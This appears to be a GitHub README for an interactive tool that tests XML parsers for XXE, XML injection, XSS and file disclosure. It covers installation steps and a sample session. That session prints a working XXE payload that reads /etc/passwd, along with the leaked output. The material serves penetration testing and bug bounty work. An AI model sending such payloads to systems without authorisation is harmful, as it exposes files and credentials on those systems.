# XML-Testing Automation
An interactive and flexible tool for penetration testing and bug bounty tasks focused on XML vulnerabilities, including XXE, XML Injection, XSS, and File Disclosure. The tool is user-friendly, with options to use default payloads or custom payloads provided via a file. Test files or URLs with real-time results and clear proofs of concept (PoC) for vulnerabilities.

# Features
XML Testing: Test for vulnerabilities such as:
XML External Entity (XXE) injection.
XML injection and malformed structures.
XSS and script injection.
Path traversal and file disclosure.
Payload Selection:
Use default payloads for quick testing.
Provide a custom payload file for advanced use cases.
Interactive Menu:
Test XML files or target URLs.
Easily navigate back to the main menu for repeated testing.
Real-time Results:
Displays well-formedness, vulnerability status, and PoC (if applicable).
Color-coded outputs for easy interpretation using colorama.
# Installation
Clone the repository:
git clone https://github.com/yourusername/xml-pentest-tool.git
cd xml-pentest-tool
Install dependencies: Use the included requirements.txt file to install all necessary libraries.
pip install -r requirements.txt
Run the tool:
python xml_pentest_tool.py

# Example 
Welcome to XML Penetration Testing Tool! 🚀

Choose input type:
1. Load XML from a file
2. Test a URL endpoint
3. Exit the tool
Enter your choice (1, 2, or 3): 1
Enter the full path to the XML file: /path/to/test.xml

Choose payload type:
1. Use default payloads
2. Use custom payloads from a file
Enter your choice (1 or 2): 1

🔍 Starting Penetration Testing for Target: File - /path/to/test.xml

[Payload 1] Testing with payload:
<root><data>&xxe;</data></root>

  ✅ Well-formedness Check: Passed
  ❌ XXE Test Result: Vulnerable!
--------------------------------------------------

[Payload 2] Testing with payload:
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>

  Well-formedness Check: Passed
  ❌ XXE Test Result: Vulnerable!
  Server Response: 200
  Response Body: root:x:0:0:root:/root:/bin/bash...
--------------------------------------------------

✅ Testing Completed!



![image](https://github.com/user-attachments/assets/97d39180-25e9-4c9e-8394-80df6149b8dc)
